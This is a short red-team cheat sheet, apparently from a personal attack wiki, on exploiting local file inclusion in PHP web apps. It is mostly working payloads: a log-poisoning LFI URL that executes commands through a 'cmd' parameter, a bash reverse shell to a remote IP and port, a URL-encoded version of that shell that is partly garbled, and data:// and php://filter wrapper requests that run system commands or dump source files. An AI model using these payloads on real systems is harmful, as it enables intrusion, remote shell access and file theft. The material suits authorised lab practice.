---
title: LFI Executing a Command
parent: Attack Repository
grand_parent: Red Team
nav_order: 7
---
Use the following URL to execute a command remotely:
```bash
http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
```
In the example above, the `whoami` command is passed to the `cmd` parameter and executed.

- Executing a Reverse Shell
To execute a reverse shell, pass the following command to the `cmd` parameter:
```bash
bash -c “bash -i >& /dev/tcp/192.168.119.3/4444 0>&1”
```

- URL-encoded reverse shell
Send the reverse shell command URL-encoded as follows:
```bash
%20-c%20%22```bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

- LFI using a PHP Wrapper
Use a PHP wrapper to retrieve the contents of a file remotely:
```bash
curl “http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system(‘uname%20-a’);?>”
```

```zsh
curl “http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php”
```

# Check FIles

- /etc/knockd.conf